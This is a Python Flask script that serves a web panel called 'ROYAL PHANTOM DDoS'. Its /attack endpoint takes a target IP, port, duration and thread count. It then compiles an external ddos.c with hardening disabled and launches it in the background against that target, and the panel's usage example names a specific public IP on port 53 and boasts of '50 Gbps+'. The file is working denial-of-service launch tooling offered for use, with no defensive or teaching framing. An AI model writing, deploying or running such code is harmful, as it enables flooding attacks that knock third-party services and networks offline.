import os
import subprocess
import sys

# Install flask
os.system(f'{sys.executable} -m pip install flask --quiet')

from flask import Flask, request

app = Flask(__name__)

@app.route('/')
def home():
    return '''
    <h2>🔥 ROYAL PHANTOM DDoS</h2>
    <p>Usage: <code>/attack?ip=IP&port=PORT&time=SECONDS&threads=NUM</code></p>
    <p>Example: <a href="/attack?ip=147.75.202.61&port=53&time=60&threads=4">/attack?ip=147.75.202.61&port=53&time=60&threads=4</a></p>
    <hr>
    <p>Vector: 5 (ALL COMBINED) | 50 Gbps+</p>
    '''

@app.route('/attack')
def attack():
    ip = request.args.get('ip')
    port = request.args.get('port')
    time = request.args.get('time')
    threads = request.args.get('threads')
    vector = request.args.get('vector', '5')
    
    if not all([ip, port, time, threads]):
        return "Error: Missing parameters", 400
    
    # Step 1: Check if C file exists
    if not os.path.exists('ddos.c'):
        return "Error: ddos.c not found", 500
    
    # Step 2: Compile with max optimization
    compile_cmd = 'gcc -o ddos ddos.c -lpthread -Wall -O3 -march=native -mtune=native -flto -fomit-frame-pointer -funroll-loops -ffast-math -D_FORTIFY_SOURCE=0 -static'
    
    result = os.system(compile_cmd)
    if result != 0:
        return f"Error: Compilation failed with code {result}", 500
    
    # Step 3: Make executable
    os.system('chmod +x ddos')
    
    # Step 4: Run attack
    cmd = ['./ddos', ip, port, time, threads, vector]
    subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    
    return f'''
    <h3>✅ Attack Started</h3>
    <p>Target: {ip}:{port}<br>
    Duration: {time}s<br>
    Threads: {threads}<br>
    Vector: {vector} (ALL COMBINED)</p>
    <p><b>Compiled fresh with 50 Gbps+ optimization!</b></p>
    <a href="/">← Back</a>
    '''

if __name__ == '__main__':
    # Initial compile on startup
    if os.path.exists('ddos.c'):
        print("[*] Compiling ddos.c with max optimization...")
        os.system('gcc -o ddos ddos.c -lpthread -Wall -O3 -march=native -mtune=native -flto -fomit-frame-pointer -funroll-loops -ffast-math -D_FORTIFY_SOURCE=0 -static')
        os.system('chmod +x ddos')
        print("[✓] Binary ready!")
    
    port = int(os.environ.get('PORT', 8080))
    app.run(host='0.0.0.0', port=port)
